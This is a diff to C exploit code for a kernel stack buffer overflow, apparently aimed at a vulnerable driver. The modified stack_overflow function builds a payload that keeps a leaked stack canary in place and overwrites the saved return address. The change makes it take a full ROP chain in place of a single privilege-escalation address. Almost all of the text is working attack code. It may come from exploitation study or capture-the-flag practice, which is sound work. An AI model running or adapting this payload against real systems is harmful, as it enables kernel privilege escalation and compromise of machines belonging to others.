@@ -33,10 +33,10 @@ uintptr_t leak_cookie(int fd, size_t leak_slots, size_t cookie_offset)
 /* Kernel stack overflow with RIP overwrite */
 void stack_overflow(int fd, 
                     uintptr_t cookie, size_t cookie_offset, 
-                    size_t pl_len, 
-                    uintptr_t ret_addr)
+                    size_t pl_sz, 
+                    uintptr_t rop[])
 {
-    size_t pl_slots = pl_len / sizeof(uintptr_t);
+    size_t pl_slots = pl_sz / sizeof(uintptr_t);
 
     uintptr_t *pl = calloc(pl_slots, sizeof(uintptr_t));
     if (!pl)
@@ -46,7 +46,7 @@ void stack_overflow(int fd,
     if (pos + 4 >= pl_slots) {
         FAILURE(
             "Payload length (%zu bytes) is too small: need at least %zu bytes to reach return address\n",
-            pl_len,
+            pl_sz,
             cookie_offset + 5 * sizeof(uintptr_t)
         );
         free(pl);
@@ -57,12 +57,20 @@ void stack_overflow(int fd,
     pl[pos++] = 0x0;        // rbx
     pl[pos++] = 0x0;        // r12
     pl[pos++] = 0x0;        // saved rbp
-    pl[pos++] = ret_addr;   // ret addr (e.g. privesc)
 
-    hexdump("[DEBUG] Payload", pl, pl_len);
-    INFO("Hijack return address on kernel stack to: 0x%016lx", (unsigned long)ret_addr);
+    // RIP — first gadget of chain
+    pl[pos++] = rop[0];
 
-    ssize_t written = write(fd, pl, pl_len);
+    // Rest of ROP chain (if any)
+    size_t i = 1;
+    while (i < pl_slots - pos && rop[i]) {
+        pl[pos++] = rop[i++];
+    }
+
+    hexdump("[DEBUG] Payload", pl, pl_sz);
+    INFO("Return addrss will be overwritten with ROP starting with: 0x%016lx", rop[0]);
+
+    ssize_t written = write(fd, pl, pl_sz);
     if (written < 0)
         DIE("write");
 
